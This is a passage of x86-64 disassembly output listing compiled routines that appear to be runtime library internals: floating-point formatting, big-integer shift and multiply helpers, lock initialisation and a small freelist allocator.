   32c486cc4:	f2 0f 59 c8          	mulsd  %xmm0,%xmm1
   32c486cc8:	f2 0f 58 0d 28 55 00 	addsd  0x5528(%rip),%xmm1        # 0x32c48c1f8
   32c486ccf:	00 
   32c486cd0:	66 48 0f 7e c8       	movq   %xmm1,%rax
   32c486cd5:	66 0f 7e ca          	movd   %xmm1,%edx
   32c486cd9:	48 c1 e8 20          	shr    $0x20,%rax
   32c486cdd:	2d 00 00 40 03       	sub    $0x3400000,%eax
   32c486ce2:	48 c1 e0 20          	shl    $0x20,%rax
   32c486ce6:	48 09 c2             	or     %rax,%rdx
   32c486ce9:	49 89 d1             	mov    %rdx,%r9
   32c486cec:	e9 91 ec ff ff       	jmp    0x32c485982
   32c486cf1:	8b 44 24 28          	mov    0x28(%rsp),%eax
   32c486cf5:	89 44 24 4c          	mov    %eax,0x4c(%rsp)
   32c486cf9:	8b 44 24 78          	mov    0x78(%rsp),%eax
   32c486cfd:	89 44 24 48          	mov    %eax,0x48(%rsp)
   32c486d01:	e9 07 f1 ff ff       	jmp    0x32c485e0d
   32c486d06:	f2 0f 58 c0          	addsd  %xmm0,%xmm0
   32c486d0a:	66 0f 2f c2          	comisd %xmm2,%xmm0
   32c486d0e:	0f 87 7e ee ff ff    	ja     0x32c485b92
   32c486d14:	66 0f 2e c2          	ucomisd %xmm2,%xmm0
   32c486d18:	c7 44 24 40 10 00 00 	movl   $0x10,0x40(%rsp)
   32c486d1f:	00 
   32c486d20:	0f 8a 6a f1 ff ff    	jp     0x32c485e90
   32c486d26:	0f 85 64 f1 ff ff    	jne    0x32c485e90
   32c486d2c:	80 e2 01             	and    $0x1,%dl
   32c486d2f:	0f 84 5b f1 ff ff    	je     0x32c485e90
   32c486d35:	e9 58 ee ff ff       	jmp    0x32c485b92
   32c486d3a:	8b 44 24 58          	mov    0x58(%rsp),%eax
   32c486d3e:	85 c0                	test   %eax,%eax
   32c486d40:	0f 88 14 f8 ff ff    	js     0x32c48655a
   32c486d46:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   32c486d4b:	c7 44 24 64 00 00 00 	movl   $0x0,0x64(%rsp)
   32c486d52:	00 
   32c486d53:	8b 40 14             	mov    0x14(%rax),%eax
   32c486d56:	85 c0                	test   %eax,%eax
   32c486d58:	0f 89 13 f2 ff ff    	jns    0x32c485f71
   32c486d5e:	e9 0d f8 ff ff       	jmp    0x32c486570
   32c486d63:	c7 44 24 64 00 00 00 	movl   $0x0,0x64(%rsp)
   32c486d6a:	00 
   32c486d6b:	e9 7f f2 ff ff       	jmp    0x32c485fef
   32c486d70:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   32c486d75:	45 31 c0             	xor    %r8d,%r8d
   32c486d78:	ba 0a 00 00 00       	mov    $0xa,%edx
   32c486d7d:	44 88 5c 24 48       	mov    %r11b,0x48(%rsp)
   32c486d82:	e8 b9 05 00 00       	call   0x32c487340
   32c486d87:	80 7c 24 48 00       	cmpb   $0x0,0x48(%rsp)
   32c486d8c:	4c 8b 4c 24 38       	mov    0x38(%rsp),%r9
   32c486d91:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   32c486d96:	0f 85 55 ff ff ff    	jne    0x32c486cf1
   32c486d9c:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   32c486da0:	89 44 24 38          	mov    %eax,0x38(%rsp)
   32c486da4:	8b 44 24 28          	mov    0x28(%rsp),%eax
   32c486da8:	89 44 24 4c          	mov    %eax,0x4c(%rsp)
   32c486dac:	8b 44 24 78          	mov    0x78(%rsp),%eax
   32c486db0:	89 44 24 48          	mov    %eax,0x48(%rsp)
   32c486db4:	e9 16 f3 ff ff       	jmp    0x32c4860cf
   32c486db9:	4d 8d 7a 01          	lea    0x1(%r10),%r15
   32c486dbd:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   32c486dc2:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   32c486dc7:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   32c486dcc:	41 c6 02 39          	movb   $0x39,(%r10)
   32c486dd0:	4d 89 fb             	mov    %r15,%r11
   32c486dd3:	e9 f1 f6 ff ff       	jmp    0x32c4864c9
   32c486dd8:	8b 4b 18             	mov    0x18(%rbx),%ecx
   32c486ddb:	85 c9                	test   %ecx,%ecx
   32c486ddd:	0f 85 76 fb ff ff    	jne    0x32c486959
   32c486de3:	85 d2                	test   %edx,%edx
   32c486de5:	0f 8f 01 fe ff ff    	jg     0x32c486bec
   32c486deb:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   32c486df0:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   32c486df5:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   32c486dfa:	e9 26 fc ff ff       	jmp    0x32c486a25
   32c486dff:	8b 44 24 48          	mov    0x48(%rsp),%eax
   32c486e03:	8b 4c 24 68          	mov    0x68(%rsp),%ecx
   32c486e07:	8d 50 ff             	lea    -0x1(%rax),%edx
   32c486e0a:	39 d1                	cmp    %edx,%ecx
   32c486e0c:	0f 8c f6 f8 ff ff    	jl     0x32c486708
   32c486e12:	29 d1                	sub    %edx,%ecx
   32c486e14:	01 44 24 50          	add    %eax,0x50(%rsp)
   32c486e18:	89 8c 24 98 00 00 00 	mov    %ecx,0x98(%rsp)
   32c486e1f:	8b 4c 24 60          	mov    0x60(%rsp),%ecx
   32c486e23:	89 84 24 ac 00 00 00 	mov    %eax,0xac(%rsp)
   32c486e2a:	01 c8                	add    %ecx,%eax
   32c486e2c:	89 8c 24 88 00 00 00 	mov    %ecx,0x88(%rsp)
   32c486e33:	89 44 24 60          	mov    %eax,0x60(%rsp)
   32c486e37:	e9 ac ee ff ff       	jmp    0x32c485ce8
   32c486e3c:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   32c486e41:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   32c486e46:	4d 8d 7a 01          	lea    0x1(%r10),%r15
   32c486e4a:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   32c486e4f:	e9 78 ff ff ff       	jmp    0x32c486dcc
   32c486e54:	8b 53 18             	mov    0x18(%rbx),%edx
   32c486e57:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   32c486e5c:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   32c486e61:	85 d2                	test   %edx,%edx
   32c486e63:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   32c486e68:	74 48                	je     0x32c486eb2
   32c486e6a:	c7 44 24 40 10 00 00 	movl   $0x10,0x40(%rsp)
   32c486e71:	00 
   32c486e72:	e9 ae fb ff ff       	jmp    0x32c486a25
   32c486e77:	8b 54 24 60          	mov    0x60(%rsp),%edx
   32c486e7b:	01 4c 24 50          	add    %ecx,0x50(%rsp)
   32c486e7f:	89 8c 24 ac 00 00 00 	mov    %ecx,0xac(%rsp)
   32c486e86:	8d 04 0a             	lea    (%rdx,%rcx,1),%eax
   32c486e89:	89 94 24 88 00 00 00 	mov    %edx,0x88(%rsp)
   32c486e90:	89 44 24 60          	mov    %eax,0x60(%rsp)
   32c486e94:	e9 4f ee ff ff       	jmp    0x32c485ce8
   32c486e99:	75 0a                	jne    0x32c486ea5
   32c486e9b:	41 f6 c0 01          	test   $0x1,%r8b
   32c486e9f:	0f 85 8a fd ff ff    	jne    0x32c486c2f
   32c486ea5:	c7 44 24 64 20 00 00 	movl   $0x20,0x64(%rsp)
   32c486eac:	00 
   32c486ead:	e9 93 fd ff ff       	jmp    0x32c486c45
   32c486eb2:	8b 44 24 64          	mov    0x64(%rsp),%eax
   32c486eb6:	89 44 24 40          	mov    %eax,0x40(%rsp)
   32c486eba:	e9 66 fb ff ff       	jmp    0x32c486a25
   32c486ebf:	8b 7c 24 30          	mov    0x30(%rsp),%edi
   32c486ec3:	f7 d7                	not    %edi
   32c486ec5:	e9 c4 f7 ff ff       	jmp    0x32c48668e
   32c486eca:	c7 44 24 40 10 00 00 	movl   $0x10,0x40(%rsp)
   32c486ed1:	00 
   32c486ed2:	83 7b 14 01          	cmpl   $0x1,0x14(%rbx)
   32c486ed6:	0f 8f e2 f3 ff ff    	jg     0x32c4862be
   32c486edc:	31 c0                	xor    %eax,%eax
   32c486ede:	83 7b 18 00          	cmpl   $0x0,0x18(%rbx)
   32c486ee2:	0f 95 c0             	setne  %al
   32c486ee5:	c1 e0 04             	shl    $0x4,%eax
   32c486ee8:	89 44 24 40          	mov    %eax,0x40(%rsp)
   32c486eec:	e9 cd f3 ff ff       	jmp    0x32c4862be
   32c486ef1:	90                   	nop
   32c486ef2:	90                   	nop
   32c486ef3:	90                   	nop
   32c486ef4:	90                   	nop
   32c486ef5:	90                   	nop
   32c486ef6:	90                   	nop
   32c486ef7:	90                   	nop
   32c486ef8:	90                   	nop
   32c486ef9:	90                   	nop
   32c486efa:	90                   	nop
   32c486efb:	90                   	nop
   32c486efc:	90                   	nop
   32c486efd:	90                   	nop
   32c486efe:	90                   	nop
   32c486eff:	90                   	nop
   32c486f00:	41 54                	push   %r12
   32c486f02:	55                   	push   %rbp
   32c486f03:	57                   	push   %rdi
   32c486f04:	56                   	push   %rsi
   32c486f05:	53                   	push   %rbx
   32c486f06:	4c 63 59 14          	movslq 0x14(%rcx),%r11
   32c486f0a:	89 d3                	mov    %edx,%ebx
   32c486f0c:	49 89 c9             	mov    %rcx,%r9
   32c486f0f:	c1 fb 05             	sar    $0x5,%ebx
   32c486f12:	41 39 db             	cmp    %ebx,%r11d
   32c486f15:	7f 19                	jg     0x32c486f30
   32c486f17:	41 c7 41 14 00 00 00 	movl   $0x0,0x14(%r9)
   32c486f1e:	00 
   32c486f1f:	41 c7 41 18 00 00 00 	movl   $0x0,0x18(%r9)
   32c486f26:	00 
   32c486f27:	5b                   	pop    %rbx
   32c486f28:	5e                   	pop    %rsi
   32c486f29:	5f                   	pop    %rdi
   32c486f2a:	5d                   	pop    %rbp
   32c486f2b:	41 5c                	pop    %r12
   32c486f2d:	c3                   	ret
   32c486f2e:	66 90                	xchg   %ax,%ax
   32c486f30:	48 8d 69 18          	lea    0x18(%rcx),%rbp
   32c486f34:	48 63 db             	movslq %ebx,%rbx
   32c486f37:	89 d7                	mov    %edx,%edi
   32c486f39:	4e 8d 54 9d 00       	lea    0x0(%rbp,%r11,4),%r10
   32c486f3e:	48 8d 74 9d 00       	lea    0x0(%rbp,%rbx,4),%rsi
   32c486f43:	83 e7 1f             	and    $0x1f,%edi
   32c486f46:	74 78                	je     0x32c486fc0
   32c486f48:	44 8b 06             	mov    (%rsi),%r8d
   32c486f4b:	89 f9                	mov    %edi,%ecx
   32c486f4d:	48 8d 56 04          	lea    0x4(%rsi),%rdx
   32c486f51:	41 d3 e8             	shr    %cl,%r8d
   32c486f54:	4c 39 d2             	cmp    %r10,%rdx
   32c486f57:	0f 83 a3 00 00 00    	jae    0x32c487000
   32c486f5d:	41 bc 20 00 00 00    	mov    $0x20,%r12d
   32c486f63:	48 89 ee             	mov    %rbp,%rsi
   32c486f66:	41 29 fc             	sub    %edi,%r12d
   32c486f69:	90                   	nop
   32c486f6a:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c486f71:	00 00 00 00 
   32c486f75:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c486f7c:	00 00 00 00 
   32c486f80:	8b 02                	mov    (%rdx),%eax
   32c486f82:	44 89 e1             	mov    %r12d,%ecx
   32c486f85:	48 83 c6 04          	add    $0x4,%rsi
   32c486f89:	48 83 c2 04          	add    $0x4,%rdx
   32c486f8d:	d3 e0                	shl    %cl,%eax
   32c486f8f:	89 f9                	mov    %edi,%ecx
   32c486f91:	44 09 c0             	or     %r8d,%eax
   32c486f94:	89 46 fc             	mov    %eax,-0x4(%rsi)
   32c486f97:	44 8b 42 fc          	mov    -0x4(%rdx),%r8d
   32c486f9b:	41 d3 e8             	shr    %cl,%r8d
   32c486f9e:	4c 39 d2             	cmp    %r10,%rdx
   32c486fa1:	72 dd                	jb     0x32c486f80
   32c486fa3:	49 29 db             	sub    %rbx,%r11
   32c486fa6:	4a 8d 44 9d fc       	lea    -0x4(%rbp,%r11,4),%rax
   32c486fab:	44 89 00             	mov    %r8d,(%rax)
   32c486fae:	45 85 c0             	test   %r8d,%r8d
   32c486fb1:	74 2b                	je     0x32c486fde
   32c486fb3:	48 83 c0 04          	add    $0x4,%rax
   32c486fb7:	eb 25                	jmp    0x32c486fde
   32c486fb9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   32c486fc0:	48 89 ef             	mov    %rbp,%rdi
   32c486fc3:	4c 39 d6             	cmp    %r10,%rsi
   32c486fc6:	0f 83 4b ff ff ff    	jae    0x32c486f17
   32c486fcc:	0f 1f 40 00          	nopl   0x0(%rax)
   32c486fd0:	a5                   	movsl  (%rsi),(%rdi)
   32c486fd1:	4c 39 d6             	cmp    %r10,%rsi
   32c486fd4:	72 fa                	jb     0x32c486fd0
   32c486fd6:	49 29 db             	sub    %rbx,%r11
   32c486fd9:	4a 8d 44 9d 00       	lea    0x0(%rbp,%r11,4),%rax
   32c486fde:	48 29 e8             	sub    %rbp,%rax
   32c486fe1:	48 c1 f8 02          	sar    $0x2,%rax
   32c486fe5:	41 89 41 14          	mov    %eax,0x14(%r9)
   32c486fe9:	85 c0                	test   %eax,%eax
   32c486feb:	0f 84 2e ff ff ff    	je     0x32c486f1f
   32c486ff1:	5b                   	pop    %rbx
   32c486ff2:	5e                   	pop    %rsi
   32c486ff3:	5f                   	pop    %rdi
   32c486ff4:	5d                   	pop    %rbp
   32c486ff5:	41 5c                	pop    %r12
   32c486ff7:	c3                   	ret
   32c486ff8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   32c486fff:	00 
   32c487000:	45 89 41 18          	mov    %r8d,0x18(%r9)
   32c487004:	45 85 c0             	test   %r8d,%r8d
   32c487007:	0f 84 0a ff ff ff    	je     0x32c486f17
   32c48700d:	48 89 e8             	mov    %rbp,%rax
   32c487010:	eb a1                	jmp    0x32c486fb3
   32c487012:	0f 1f 00             	nopl   (%rax)
   32c487015:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c48701c:	00 00 00 00 
   32c487020:	48 63 51 14          	movslq 0x14(%rcx),%rdx
   32c487024:	48 8d 41 18          	lea    0x18(%rcx),%rax
   32c487028:	48 8d 0c 90          	lea    (%rax,%rdx,4),%rcx
   32c48702c:	31 d2                	xor    %edx,%edx
   32c48702e:	48 39 c8             	cmp    %rcx,%rax
   32c487031:	72 19                	jb     0x32c48704c
   32c487033:	eb 2a                	jmp    0x32c48705f
   32c487035:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c48703c:	00 00 00 00 
   32c487040:	48 83 c0 04          	add    $0x4,%rax
   32c487044:	83 c2 20             	add    $0x20,%edx
   32c487047:	48 39 c8             	cmp    %rcx,%rax
   32c48704a:	73 13                	jae    0x32c48705f
   32c48704c:	44 8b 00             	mov    (%rax),%r8d
   32c48704f:	45 85 c0             	test   %r8d,%r8d
   32c487052:	74 ec                	je     0x32c487040
   32c487054:	48 39 c8             	cmp    %rcx,%rax
   32c487057:	73 06                	jae    0x32c48705f
   32c487059:	f3 0f bc 00          	tzcnt  (%rax),%eax
   32c48705d:	01 c2                	add    %eax,%edx
   32c48705f:	89 d0                	mov    %edx,%eax
   32c487061:	c3                   	ret
   32c487062:	90                   	nop
   32c487063:	90                   	nop
   32c487064:	90                   	nop
   32c487065:	90                   	nop
   32c487066:	90                   	nop
   32c487067:	90                   	nop
   32c487068:	90                   	nop
   32c487069:	90                   	nop
   32c48706a:	90                   	nop
   32c48706b:	90                   	nop
   32c48706c:	90                   	nop
   32c48706d:	90                   	nop
   32c48706e:	90                   	nop
   32c48706f:	90                   	nop
   32c487070:	90                   	nop
   32c487071:	90                   	nop
   32c487072:	90                   	nop
   32c487073:	90                   	nop
   32c487074:	90                   	nop
   32c487075:	90                   	nop
   32c487076:	90                   	nop
   32c487077:	90                   	nop
   32c487078:	90                   	nop
   32c487079:	90                   	nop
   32c48707a:	90                   	nop
   32c48707b:	90                   	nop
   32c48707c:	90                   	nop
   32c48707d:	90                   	nop
   32c48707e:	90                   	nop
   32c48707f:	90                   	nop
   32c487080:	56                   	push   %rsi
   32c487081:	53                   	push   %rbx
   32c487082:	48 83 ec 38          	sub    $0x38,%rsp
   32c487086:	8b 05 04 8a 00 00    	mov    0x8a04(%rip),%eax        # 0x32c48fa90
   32c48708c:	89 ce                	mov    %ecx,%esi
   32c48708e:	83 f8 02             	cmp    $0x2,%eax
   32c487091:	0f 84 c9 00 00 00    	je     0x32c487160
   32c487097:	85 c0                	test   %eax,%eax
   32c487099:	74 3d                	je     0x32c4870d8
   32c48709b:	83 f8 01             	cmp    $0x1,%eax
   32c48709e:	75 2b                	jne    0x32c4870cb
   32c4870a0:	48 8b 1d 49 a1 00 00 	mov    0xa149(%rip),%rbx        # 0x32c4911f0
   32c4870a7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   32c4870ae:	00 00 
   32c4870b0:	b9 01 00 00 00       	mov    $0x1,%ecx
   32c4870b5:	ff d3                	call   *%rbx
   32c4870b7:	8b 05 d3 89 00 00    	mov    0x89d3(%rip),%eax        # 0x32c48fa90
   32c4870bd:	83 f8 01             	cmp    $0x1,%eax
   32c4870c0:	74 ee                	je     0x32c4870b0
   32c4870c2:	83 f8 02             	cmp    $0x2,%eax
   32c4870c5:	0f 84 95 00 00 00    	je     0x32c487160
   32c4870cb:	48 83 c4 38          	add    $0x38,%rsp
   32c4870cf:	5b                   	pop    %rbx
   32c4870d0:	5e                   	pop    %rsi
   32c4870d1:	c3                   	ret
   32c4870d2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c4870d8:	b8 01 00 00 00       	mov    $0x1,%eax
   32c4870dd:	87 05 ad 89 00 00    	xchg   %eax,0x89ad(%rip)        # 0x32c48fa90
   32c4870e3:	85 c0                	test   %eax,%eax
   32c4870e5:	75 59                	jne    0x32c487140
   32c4870e7:	48 8b 05 ea a0 00 00 	mov    0xa0ea(%rip),%rax        # 0x32c4911d8
   32c4870ee:	48 8d 1d ab 89 00 00 	lea    0x89ab(%rip),%rbx        # 0x32c48faa0
   32c4870f5:	48 89 d9             	mov    %rbx,%rcx
   32c4870f8:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   32c4870fd:	ff d0                	call   *%rax
   32c4870ff:	48 8d 4b 28          	lea    0x28(%rbx),%rcx
   32c487103:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   32c487108:	ff d0                	call   *%rax
   32c48710a:	48 8d 0d 5f 00 00 00 	lea    0x5f(%rip),%rcx        # 0x32c487170
   32c487111:	e8 1a a2 ff ff       	call   0x32c481330
   32c487116:	c7 05 70 89 00 00 02 	movl   $0x2,0x8970(%rip)        # 0x32c48fa90
   32c48711d:	00 00 00 
   32c487120:	48 89 f0             	mov    %rsi,%rax
   32c487123:	48 f7 d8             	neg    %rax
   32c487126:	83 e0 28             	and    $0x28,%eax
   32c487129:	48 8d 0c 03          	lea    (%rbx,%rax,1),%rcx
   32c48712d:	48 83 c4 38          	add    $0x38,%rsp
   32c487131:	5b                   	pop    %rbx
   32c487132:	5e                   	pop    %rsi
   32c487133:	48 ff 25 86 a0 00 00 	rex.W jmp *0xa086(%rip)        # 0x32c4911c0
   32c48713a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c487140:	48 8d 1d 59 89 00 00 	lea    0x8959(%rip),%rbx        # 0x32c48faa0
   32c487147:	83 f8 02             	cmp    $0x2,%eax
   32c48714a:	74 ca                	je     0x32c487116
   32c48714c:	8b 05 3e 89 00 00    	mov    0x893e(%rip),%eax        # 0x32c48fa90
   32c487152:	83 f8 01             	cmp    $0x1,%eax
   32c487155:	0f 84 45 ff ff ff    	je     0x32c4870a0
   32c48715b:	e9 62 ff ff ff       	jmp    0x32c4870c2
   32c487160:	48 8d 1d 39 89 00 00 	lea    0x8939(%rip),%rbx        # 0x32c48faa0
   32c487167:	eb b7                	jmp    0x32c487120
   32c487169:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   32c487170:	48 83 ec 38          	sub    $0x38,%rsp
   32c487174:	b8 03 00 00 00       	mov    $0x3,%eax
   32c487179:	87 05 11 89 00 00    	xchg   %eax,0x8911(%rip)        # 0x32c48fa90
   32c48717f:	83 f8 02             	cmp    $0x2,%eax
   32c487182:	74 0c                	je     0x32c487190
   32c487184:	48 83 c4 38          	add    $0x38,%rsp
   32c487188:	c3                   	ret
   32c487189:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   32c487190:	48 8b 05 21 a0 00 00 	mov    0xa021(%rip),%rax        # 0x32c4911b8
   32c487197:	48 8d 0d 02 89 00 00 	lea    0x8902(%rip),%rcx        # 0x32c48faa0
   32c48719e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   32c4871a3:	ff d0                	call   *%rax
   32c4871a5:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   32c4871aa:	48 8d 0d 17 89 00 00 	lea    0x8917(%rip),%rcx        # 0x32c48fac8
   32c4871b1:	48 83 c4 38          	add    $0x38,%rsp
   32c4871b5:	48 ff e0             	rex.W jmp *%rax
   32c4871b8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   32c4871bf:	00 
   32c4871c0:	56                   	push   %rsi
   32c4871c1:	53                   	push   %rbx
   32c4871c2:	48 83 ec 38          	sub    $0x38,%rsp
   32c4871c6:	89 cb                	mov    %ecx,%ebx
   32c4871c8:	31 c9                	xor    %ecx,%ecx
   32c4871ca:	e8 b1 fe ff ff       	call   0x32c487080
   32c4871cf:	83 fb 09             	cmp    $0x9,%ebx
   32c4871d2:	7f 3c                	jg     0x32c487210
   32c4871d4:	48 8d 15 65 88 00 00 	lea    0x8865(%rip),%rdx        # 0x32c48fa40
   32c4871db:	48 63 cb             	movslq %ebx,%rcx
   32c4871de:	48 8b 04 ca          	mov    (%rdx,%rcx,8),%rax
   32c4871e2:	48 85 c0             	test   %rax,%rax
   32c4871e5:	74 79                	je     0x32c487260
   32c4871e7:	4c 8b 00             	mov    (%rax),%r8
   32c4871ea:	83 3d 9f 88 00 00 02 	cmpl   $0x2,0x889f(%rip)        # 0x32c48fa90
   32c4871f1:	4c 89 04 ca          	mov    %r8,(%rdx,%rcx,8)
   32c4871f5:	75 55                	jne    0x32c48724c
   32c4871f7:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   32c4871fc:	48 8d 0d 9d 88 00 00 	lea    0x889d(%rip),%rcx        # 0x32c48faa0
   32c487203:	ff 15 d7 9f 00 00    	call   *0x9fd7(%rip)        # 0x32c4911e0
   32c487209:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   32c48720e:	eb 3c                	jmp    0x32c48724c
   32c487210:	89 d9                	mov    %ebx,%ecx
   32c487212:	be 01 00 00 00       	mov    $0x1,%esi
   32c487217:	d3 e6                	shl    %cl,%esi
   32c487219:	8d 46 ff             	lea    -0x1(%rsi),%eax
   32c48721c:	48 98                	cltq
   32c48721e:	48 8d 0c 85 27 00 00 	lea    0x27(,%rax,4),%rcx
   32c487225:	00 
   32c487226:	48 b8 f8 ff ff ff 07 	movabs $0x7fffffff8,%rax
   32c48722d:	00 00 00 
   32c487230:	48 21 c1             	and    %rax,%rcx
   32c487233:	e8 60 12 00 00       	call   0x32c488498
   32c487238:	48 85 c0             	test   %rax,%rax
   32c48723b:	74 17                	je     0x32c487254
   32c48723d:	83 3d 4c 88 00 00 02 	cmpl   $0x2,0x884c(%rip)        # 0x32c48fa90
   32c487244:	89 58 08             	mov    %ebx,0x8(%rax)
   32c487247:	89 70 0c             	mov    %esi,0xc(%rax)
   32c48724a:	74 ab                	je     0x32c4871f7
   32c48724c:	48 c7 40 10 00 00 00 	movq   $0x0,0x10(%rax)
   32c487253:	00 
   32c487254:	48 83 c4 38          	add    $0x38,%rsp
   32c487258:	5b                   	pop    %rbx
   32c487259:	5e                   	pop    %rsi
   32c48725a:	c3                   	ret
   32c48725b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c487260:	89 d9                	mov    %ebx,%ecx
   32c487262:	be 01 00 00 00       	mov    $0x1,%esi
   32c487267:	4c 8d 05 d2 7e 00 00 	lea    0x7ed2(%rip),%r8        # 0x32c48f140
   32c48726e:	d3 e6                	shl    %cl,%esi
   32c487270:	8d 46 ff             	lea    -0x1(%rsi),%eax
   32c487273:	48 98                	cltq
   32c487275:	48 8d 0c 85 27 00 00 	lea    0x27(,%rax,4),%rcx
   32c48727c:	00 
   32c48727d:	48 8b 05 0c 1e 00 00 	mov    0x1e0c(%rip),%rax        # 0x32c489090
   32c487284:	48 89 c2             	mov    %rax,%rdx
   32c487287:	4c 29 c2             	sub    %r8,%rdx
   32c48728a:	49 89 c8             	mov    %rcx,%r8
   32c48728d:	48 c1 fa 03          	sar    $0x3,%rdx
   32c487291:	49 c1 e8 03          	shr    $0x3,%r8
   32c487295:	4c 01 c2             	add    %r8,%rdx
   32c487298:	48 81 fa 20 01 00 00 	cmp    $0x120,%rdx
   32c48729f:	0f 87 6b ff ff ff    	ja     0x32c487210
   32c4872a5:	48 ba f8 ff ff ff 07 	movabs $0x7fffffff8,%rdx
   32c4872ac:	00 00 00 
   32c4872af:	48 21 d1             	and    %rdx,%rcx
   32c4872b2:	48 01 c1             	add    %rax,%rcx
   32c4872b5:	48 89 0d d4 1d 00 00 	mov    %rcx,0x1dd4(%rip)        # 0x32c489090
   32c4872bc:	e9 7c ff ff ff       	jmp    0x32c48723d
   32c4872c1:	0f 1f 40 00          	nopl   0x0(%rax)
   32c4872c5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c4872cc:	00 00 00 00 
   32c4872d0:	48 83 ec 38          	sub    $0x38,%rsp
   32c4872d4:	48 85 c9             	test   %rcx,%rcx
   32c4872d7:	74 47                	je     0x32c487320
   32c4872d9:	83 79 08 09          	cmpl   $0x9,0x8(%rcx)
   32c4872dd:	7e 11                	jle    0x32c4872f0
   32c4872df:	48 83 c4 38          	add    $0x38,%rsp
   32c4872e3:	e9 d0 a3 ff ff       	jmp    0x32c4816b8
   32c4872e8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   32c4872ef:	00 
   32c4872f0:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   32c4872f5:	31 c9                	xor    %ecx,%ecx
   32c4872f7:	e8 84 fd ff ff       	call   0x32c487080
   32c4872fc:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   32c487301:	48 8d 15 38 87 00 00 	lea    0x8738(%rip),%rdx        # 0x32c48fa40
   32c487308:	83 3d 81 87 00 00 02 	cmpl   $0x2,0x8781(%rip)        # 0x32c48fa90
   32c48730f:	48 63 48 08          	movslq 0x8(%rax),%rcx
   32c487313:	4c 8b 04 ca          	mov    (%rdx,%rcx,8),%r8
   32c487317:	48 89 04 ca          	mov    %rax,(%rdx,%rcx,8)
   32c48731b:	4c 89 00             	mov    %r8,(%rax)
   32c48731e:	74 08                	je     0x32c487328
   32c487320:	48 83 c4 38          	add    $0x38,%rsp
   32c487324:	c3                   	ret
   32c487325:	0f 1f 00             	nopl   (%rax)
   32c487328:	48 8d 0d 71 87 00 00 	lea    0x8771(%rip),%rcx        # 0x32c48faa0
   32c48732f:	48 83 c4 38          	add    $0x38,%rsp
   32c487333:	48 ff 25 a6 9e 00 00 	rex.W jmp *0x9ea6(%rip)        # 0x32c4911e0
   32c48733a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c487340:	53                   	push   %rbx
   32c487341:	48 83 ec 30          	sub    $0x30,%rsp
   32c487345:	44 8b 59 14          	mov    0x14(%rcx),%r11d
   32c487349:	49 89 c9             	mov    %rcx,%r9
   32c48734c:	4d 63 d0             	movslq %r8d,%r10
   32c48734f:	48 63 d2             	movslq %edx,%rdx
   32c487352:	31 c9                	xor    %ecx,%ecx
   32c487354:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c48735b:	00 00 00 00 
   32c48735f:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c487366:	00 00 00 00 
   32c48736a:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c487371:	00 00 00 00 
   32c487375:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c48737c:	00 00 00 00 
   32c487380:	41 8b 44 89 18       	mov    0x18(%r9,%rcx,4),%eax
   32c487385:	48 0f af c2          	imul   %rdx,%rax
   32c487389:	4c 01 d0             	add    %r10,%rax
   32c48738c:	41 89 44 89 18       	mov    %eax,0x18(%r9,%rcx,4)
   32c487391:	49 89 c2             	mov    %rax,%r10
   32c487394:	48 83 c1 01          	add    $0x1,%rcx
   32c487398:	49 c1 ea 20          	shr    $0x20,%r10
   32c48739c:	41 39 cb             	cmp    %ecx,%r11d
   32c48739f:	7f df                	jg     0x32c487380
   32c4873a1:	4c 89 cb             	mov    %r9,%rbx
   32c4873a4:	4d 85 d2             	test   %r10,%r10
   32c4873a7:	74 19                	je     0x32c4873c2
   32c4873a9:	45 39 59 0c          	cmp    %r11d,0xc(%r9)
   32c4873ad:	7e 21                	jle    0x32c4873d0
   32c4873af:	49 63 c3             	movslq %r11d,%rax
   32c4873b2:	41 83 c3 01          	add    $0x1,%r11d
   32c4873b6:	4c 89 cb             	mov    %r9,%rbx
